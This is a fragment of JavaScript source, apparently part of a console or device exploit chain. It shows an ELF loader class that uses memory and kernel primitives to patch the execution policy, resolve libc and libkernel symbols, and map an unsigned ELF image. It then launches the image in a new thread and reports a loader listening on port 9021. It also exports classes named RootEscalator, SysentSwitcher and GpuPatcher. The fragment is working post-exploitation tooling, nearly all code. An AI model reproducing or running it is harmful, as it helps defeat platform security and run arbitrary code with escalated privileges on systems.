            const profileSymbols = this.profile.value("loader.symbols");
            const entryNames = entries.map((entry) => entry.name);
            const expectedNames = Object.keys(profileSymbols);
            if (entryNames.length !== expectedNames.length
                || new Set(entryNames).size !== entryNames.length
                || expectedNames.some((name) => !entryNames.includes(name)))
                throw new Error(`elfldr GLOB_DAT inventory mismatch: `
                    + `${entryNames.length}/${expectedNames.length}`);

            const libcBase = this.getLibcBase();
            for (const entry of entries) {
                const symbol = profileSymbols[entry.name];
                let address;
                if (symbol.module === "libkernel") {
                    address = U64.from(this.bridge.kernel(
                        `native.exports.${symbol.export}`));
                } else {
                    address = libcBase.add(this.profile.offset(
                        `loader.symbols.${entry.name}.offset`));
                }
                if (!address.isUserPointer())
                    throw new Error(`elfldr ${entry.name} resolved outside userland: `
                        + address.toHex());
                this.memory.write64(
                    this.mappingBase.add32(entry.offset).toPointerNumber(),
                    address);
            }
        }

        async prepare() {
            if (this.prepared) return this.prepared;
            if (this.started)
                throw new Error("elfldr cannot be prepared after startup");
            this.verifyLoaderPrerequisites();
            const image = await this.fetchImage();
            this.patchExecutionPolicy();
            const environment = this.createEnvironment();
            const sysDynlibDlsym = this.getDlsymAddress();
            this.verifyDlsym(sysDynlibDlsym);
            const rwpipe = this.kernel.alloc(8, 4, "elfldr-rwpipe");
            rwpipe.put32(0, environment.pipes[0]);
            rwpipe.put32(4, environment.pipes[1]);
            const rwpair = this.kernel.alloc(8, 4, "elfldr-rwpair");
            rwpair.put32(0, environment.sockets[0]);
            rwpair.put32(4, environment.sockets[1]);
            const output = this.kernel.alloc(4, 4, "elfldr-output");
            output.put32(0, 0x7fffffff);
            const args = this.kernel.alloc(0x30, 8, "elfldr-args");
            args.put64(0x00, sysDynlibDlsym);
            args.put64(0x08, rwpipe.address);
            args.put64(0x10, rwpair.address);
            args.put64(0x18, environment.kernelPipe);
            args.put64(0x20, this.rootContext.dataBase);
            args.put64(0x28, output.address);

            const thread = this.kernel.alloc(8, 8, "elfldr-thread");
            const attr = this.kernel.alloc(0x100, 0x10, "elfldr-attr");
            const name = this.kernel.alloc(0x10, 8, "elfldr-name");
            name.putCString(0, "elfldr", 0x10);
            const wait = this.kernel.alloc(0x10, 8, "elfldr-wait");
            if (this.bridge.callOffsetI32("native.exports.pthreadAttrInit",
                [attr.address]) !== 0)
                throw new Error("elfldr pthread attr init failed");
            let entry = 0;
            try {
                if (this.bridge.callOffsetI32("native.exports.pthreadAttrSetstacksize",
                    [attr.address, 0x80000]) !== 0)
                    throw new Error("elfldr pthread stack-size setup failed");
                if (this.bridge.callOffsetI32("native.exports.pthreadAttrSetdetachstate",
                    [attr.address, 1]) !== 0)
                    throw new Error("elfldr pthread detach-state setup failed");
                entry = this.mapImage(image);
                this.resolveGlobDat(image);
            } catch (error) {
                this.bridge.callOffsetI32("native.exports.pthreadAttrDestroy",
                    [attr.address]);
                throw error;
            }

            this.prepared = Object.freeze({ entry, args, thread, attr, name,
                output, wait, environment });
            return this.prepared;
        }

        async start(prepared, onStarted) {
            if (!prepared || prepared !== this.prepared)
                throw new Error("elfldr prepared state does not belong to this loader");
            if (this.started)
                throw new Error("elfldr has already started");
            this.started = true;

            let result = -1;
            try {
                result = this.bridge.callOffsetI32("native.exports.pthreadCreate",
                    [prepared.thread.address, prepared.attr.address,
                        prepared.entry, prepared.args.address,
                        prepared.name.address]);
            } finally {
                this.bridge.callOffsetI32("native.exports.pthreadAttrDestroy",
                    [prepared.attr.address]);
            }
            if (result !== 0) throw new Error(`elfldr pthread create failed ${result}`);
            if (typeof onStarted === "function") onStarted();
            const BOOTSTRAP_SENTINEL = 0x7fffffff;
            const POLL_MS = 500;
            const MAX_MS = 10000;
            let waited = 0;
            let bootstrapResult = BOOTSTRAP_SENTINEL;
            while (waited < MAX_MS) {
                prepared.wait.put64(0, 0);
                prepared.wait.put64(8, POLL_MS * 1000000);
                this.bridge.callOffset("native.exports.nanosleep",
                    [prepared.wait.address, 0]);
                waited += POLL_MS;
                bootstrapResult = prepared.output.get32(0) | 0;
                if (bootstrapResult !== BOOTSTRAP_SENTINEL) break;
            }
            if (bootstrapResult === BOOTSTRAP_SENTINEL)
                throw new Error(`elfldr bootstrap did not complete within `
                    + `${MAX_MS / 1000} seconds`);
            if (bootstrapResult !== 0)
                throw new Error(`elfldr bootstrap returned ${bootstrapResult}`);
            return { entry: prepared.entry, port: 9021, bootstrapResult,
                thread: prepared.thread.get64(0) };
        }

        async launch(onStarted) {
            const prepared = await this.prepare();
            return this.start(prepared, onStarted);
        }

    }

    NS.RootEscalator = RootEscalator;
    NS.SysentSwitcher = SysentSwitcher;
    NS.GpuPatcher = GpuPatcher;
    NS.Elf64Image = Elf64Image;
    NS.ElfLoader = ElfLoader;
    NS.sha256Hex = sha256Hex;
    if (typeof module !== "undefined" && module.exports)
        module.exports = { RootEscalator, SysentSwitcher, GpuPatcher,
            Elf64Image, ElfLoader, sha256Hex };
})(typeof globalThis !== "undefined" ? globalThis : this);
